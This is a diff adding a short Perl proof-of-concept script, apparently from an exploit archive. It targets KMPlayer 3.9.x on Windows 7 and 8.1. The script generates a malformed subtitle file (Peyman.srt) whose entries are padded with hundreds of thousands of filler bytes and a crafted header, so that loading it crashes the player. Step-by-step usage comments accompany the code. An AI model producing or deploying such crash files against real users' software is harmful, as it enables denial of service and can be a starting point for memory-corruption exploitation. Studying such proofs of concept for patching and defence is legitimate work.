@@ -1,0 +1,27 @@
+#!/usr/bin/perl -w
+# Title : KMPlayer 3.9.x - Crash Proof Of Concept
+# Company : http://www.kmplayer.com
+# Tested : Windows 7 / Windows 8.1
+#
+#
+# Author      :   Peyman Motevalli Manesh
+# Linkedin    :   https://ir.linkedin.com/in/peymanmotevalli
+# E-Mail      :   me[at]PDPnetwork[dot]ir 
+# Website     :   www.PDPnetwork.ir
+# FaceBook    :   https://www.facebook.com/Peyman.Motevalli
+#
+#
+# 1 . run perl code : perl km.pl
+# 2 . open "kmplayer"
+# 3 . Load Subtitle (Peyman.srt)
+# 4 . Crashed
+$eheader="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x46\x14";
+$h="\x42"x9850;
+$poc="\x41"x500000;
+$poc="$h$poc$eheader";
+open (Peyman, '>Peyman.srt');
+for ($i=1;$i<=4;$i++){
+print Peyman "$i\n00:00:01,800 --> 00:00:05,500\n";
+print Peyman $poc;
+}
+close (Peyman);
